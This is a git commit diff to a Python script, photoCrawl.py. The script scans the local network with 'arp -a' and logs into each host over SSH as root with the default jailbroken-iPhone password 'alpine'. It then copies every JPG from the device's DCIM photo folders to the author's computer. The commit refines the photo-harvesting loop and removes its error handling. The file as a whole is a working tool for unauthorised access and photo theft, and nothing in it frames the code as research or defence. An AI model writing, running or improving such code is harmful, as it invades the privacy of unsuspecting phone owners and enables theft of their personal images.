acc21366f05ee3f57e0e48d67e8d79665d658183
cbass <vcbass0@icloud.com>
2020-02-06 09:48:39 -0800

    Update photoCrawl.py

--- photoCrawl.py
+++ photoCrawl.py
@@ -4,14 +4,15 @@ import re
 import os
 import sys
 import socket
+import time
 from paramiko.ssh_exception import SSHException
 from stat import S_ISDIR
 
 client = paramiko.SSHClient()
 USERNAME = "root"
 PASS = "alpine"
-REMOTE = '/private/var/mobile/Media/DCIM/100APPLE/'
-HOME = '/Users/cbass/Downloads/dsd/'
+REMOTE = '/private/var/mobile/Media/DCIM'
+HOME = '/Users/cbass/Downloads/dsd'
 
 arpScanResult = str(subprocess.run(['arp', '-a'], stdout=subprocess.PIPE))
 ipList = re.findall(re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), arpScanResult)
@@ -21,7 +22,6 @@ def looper(i):
     print("Connecting to "+ipList[i])
     client.load_system_host_keys()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
     try:
         client.connect(ipList[i], username=USERNAME, password=PASS, timeout=5)
         download_dir(REMOTE, HOME)
@@ -39,25 +39,31 @@ def looper(i):
             sys.exit(1)
         looper(i+1);
         pass
-    except (SSHException, OSError) as error:
-        print("error")
-        if(len(ipList)-1==i):
-            print("done")
-            sys.exit(1)
-        looper(i+1);
-        pass
+    # except (SSHException, OSError) as error:
+    #     print("error")
+    #     if(len(ipList)-1==i):
+    #         print("done")
+    #         sys.exit(1)
+    #     looper(i+1);
+    #     pass
 
 
 def download_dir(remote_dir, local_dir):
     print("CONNECTED")
+    boof = client.get_transport()
+    boof.default_window_size = paramiko.common.MAX_WINDOW_SIZE
     ftp = client.open_sftp()
     os.path.exists(local_dir) or os.makedirs(local_dir)
-    dir_items = ftp.listdir_attr(remote_dir)
-    for item in dir_items:
-        remote_path = remote_dir + '/' + item.filename
-        local_path = os.path.join(local_dir, item.filename)
-        if S_ISDIR(item.st_mode):
-            download_dir(remote_path, local_path)
-        else:
-            ftp.get(remote_path, local_path)
+    print(ftp.listdir(remote_dir))
+    for directory in ftp.listdir(remote_dir):
+        newDir = remote_dir+'/'+directory
+        print(newDir)
+        for filename in ftp.listdir(newDir):
+             if filename.endswith('.JPG'):
+                 print (filename)
+                 local_path = os.path.join(local_dir, filename)
+                 remote_path = newDir + '/' +filename
+                 ftp.get(remote_path, local_path)
+                 time.sleep(0.01)
+
 looper(0)
